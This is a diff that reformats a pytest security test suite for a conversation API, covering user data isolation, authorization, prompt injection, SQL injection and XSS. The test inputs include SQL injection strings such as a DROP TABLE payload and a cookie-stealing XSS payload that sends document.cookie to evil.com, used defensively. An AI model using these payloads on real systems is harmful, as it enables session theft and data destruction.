@@ -96,17 +96,24 @@ class TestDataIsolation:
     def test_user_cannot_see_others_conversations(self, app_client, auth_headers):
         """User A's conversations should not appear in User B's list."""
         # Alice creates a conversation
-        resp = app_client.post("/query", headers=auth_headers, json={
-            "question": "Alice's private query",
-        })
+        resp = app_client.post(
+            "/query",
+            headers=auth_headers,
+            json={
+                "question": "Alice's private query",
+            },
+        )
         alice_conv_id = resp.json()["conversation_id"]
 
         # Bob registers
-        bob = app_client.post("/auth/register", json={
-            "username": "iso_bob",
-            "email": "iso_bob@test.com",
-            "password": "Str0ngPass!",
-        })
+        bob = app_client.post(
+            "/auth/register",
+            json={
+                "username": "iso_bob",
+                "email": "iso_bob@test.com",
+                "password": "Str0ngPass!",
+            },
+        )
         bob_headers = {"Authorization": f"Bearer {bob.json()['token']}"}
 
         # Bob lists conversations
@@ -117,32 +124,46 @@ class TestDataIsolation:
 
     def test_user_cannot_access_others_conversation(self, app_client, auth_headers):
         """Direct access to another user's conversation should return 403."""
-        resp = app_client.post("/query", headers=auth_headers, json={
-            "question": "Private data",
-        })
+        resp = app_client.post(
+            "/query",
+            headers=auth_headers,
+            json={
+                "question": "Private data",
+            },
+        )
         conv_id = resp.json()["conversation_id"]
 
-        bob = app_client.post("/auth/register", json={
-            "username": "iso_bob2",
-            "email": "iso_bob2@test.com",
-            "password": "Str0ngPass!",
-        })
+        bob = app_client.post(
+            "/auth/register",
+            json={
+                "username": "iso_bob2",
+                "email": "iso_bob2@test.com",
+                "password": "Str0ngPass!",
+            },
+        )
         bob_headers = {"Authorization": f"Bearer {bob.json()['token']}"}
 
         resp = app_client.get(f"/conversations/{conv_id}", headers=bob_headers)
         assert resp.status_code == 403
 
     def test_user_cannot_delete_others_conversation(self, app_client, auth_headers):
-        resp = app_client.post("/query", headers=auth_headers, json={
-            "question": "Don't delete me",
-        })
+        resp = app_client.post(
+            "/query",
+            headers=auth_headers,
+            json={
+                "question": "Don't delete me",
+            },
+        )
         conv_id = resp.json()["conversation_id"]
 
-        eve = app_client.post("/auth/register", json={
-            "username": "iso_eve",
-            "email": "iso_eve@test.com",
-            "password": "Str0ngPass!",
-        })
+        eve = app_client.post(
+            "/auth/register",
+            json={
+                "username": "iso_eve",
+                "email": "iso_eve@test.com",
+                "password": "Str0ngPass!",
+            },
+        )
         eve_headers = {"Authorization": f"Bearer {eve.json()['token']}"}
 
         resp = app_client.delete(f"/conversations/{conv_id}", headers=eve_headers)
@@ -162,9 +183,13 @@ class TestPromptInjection:
             "<script>alert('xss')</script> What is the team doing?",
         ]
         for injection in injections:
-            resp = app_client.post("/query", headers=auth_headers, json={
-                "question": injection,
-            })
+            resp = app_client.post(
+                "/query",
+                headers=auth_headers,
+                json={
+                    "question": injection,
+                },
+            )
             # Should not crash — returns 200 with a response
             assert resp.status_code == 200
             data = resp.json()
@@ -187,9 +212,13 @@ class TestSQLInjection:
             "' UNION SELECT * FROM users --",
         ]
         for payload in payloads:
-            resp = app_client.post("/members", headers=auth_headers, json={
-                "name": payload,
-            })
+            resp = app_client.post(
+                "/members",
+                headers=auth_headers,
+                json={
+                    "name": payload,
+                },
+            )
             # Should succeed (parameterized queries) or reject gracefully
             assert resp.status_code in (200, 201, 422)
 
@@ -199,9 +228,13 @@ class TestSQLInjection:
 
     def test_sql_injection_in_search(self, app_client, auth_headers):
         """SQL injection in query question should be safely handled."""
-        resp = app_client.post("/query", headers=auth_headers, json={
-            "question": "' OR '1'='1'; DROP TABLE conversations; --",
-        })
+        resp = app_client.post(
+            "/query",
+            headers=auth_headers,
+            json={
+                "question": "' OR '1'='1'; DROP TABLE conversations; --",
+            },
+        )
         assert resp.status_code == 200
 
     def test_sql_injection_in_conversation_id(self, app_client, auth_headers):
@@ -219,26 +252,38 @@ class TestSQLInjection:
 class TestXSSPrevention:
     def test_xss_in_member_name(self, app_client, auth_headers):
         """XSS payload in member name should be stored safely (no execution)."""
-        resp = app_client.post("/members", headers=auth_headers, json={
-            "name": '<img src=x onerror="alert(1)">',
-        })
+        resp = app_client.post(
+            "/members",
+            headers=auth_headers,
+            json={
+                "name": '<img src=x onerror="alert(1)">',
+            },
+        )
         assert resp.status_code in (201, 200)
         # The name is stored but should not be interpreted as HTML by API
         if resp.status_code in (200, 201):
             assert "name" in resp.json()
 
     def test_xss_in_room_name(self, app_client, auth_headers):
-        resp = app_client.post("/rooms", headers=auth_headers, json={
-            "name": "<script>alert('xss')</script>",
-        })
+        resp = app_client.post(
+            "/rooms",
+            headers=auth_headers,
+            json={
+                "name": "<script>alert('xss')</script>",
+            },
+        )
         assert resp.status_code in (200, 201)
 
     def test_xss_in_discussion_title(self, app_client, auth_headers):
-        resp = app_client.post("/discussions", headers=auth_headers, json={
-            "title": '<img onerror="fetch(`evil.com?c=${document.cookie}`)">',
-            "context_type": "member",
-            "context_id": "xss-test",
-        })
+        resp = app_client.post(
+            "/discussions",
+            headers=auth_headers,
+            json={
+                "title": '<img onerror="fetch(`evil.com?c=${document.cookie}`)">',
+                "context_type": "member",
+                "context_id": "xss-test",
+            },
+        )
         assert resp.status_code in (200, 201)
 
 
@@ -292,17 +337,24 @@ class TestAuthorization:
     def test_participant_endpoint_requires_access(self, app_client, auth_headers):
         """Participant list for a conversation requires membership."""
         # Create conversation
-        resp = app_client.post("/query", headers=auth_headers, json={
-            "question": "test",
-        })
+        resp = app_client.post(
+            "/query",
+            headers=auth_headers,
+            json={
+                "question": "test",
+            },
+        )
         conv_id = resp.json()["conversation_id"]
 
         # Another user tries to list participants
-        other = app_client.post("/auth/register", json={
-            "username": "sec_other",
-            "email": "sec_other@test.com",
-            "password": "Str0ngPass!",
-        })
+        other = app_client.post(
+            "/auth/register",
+            json={
+                "username": "sec_other",
+                "email": "sec_other@test.com",
+                "password": "Str0ngPass!",
+            },
+        )
         other_headers = {"Authorization": f"Bearer {other.json()['token']}"}
         resp = app_client.get(f"/conversations/{conv_id}/participants", headers=other_headers)
         assert resp.status_code == 403
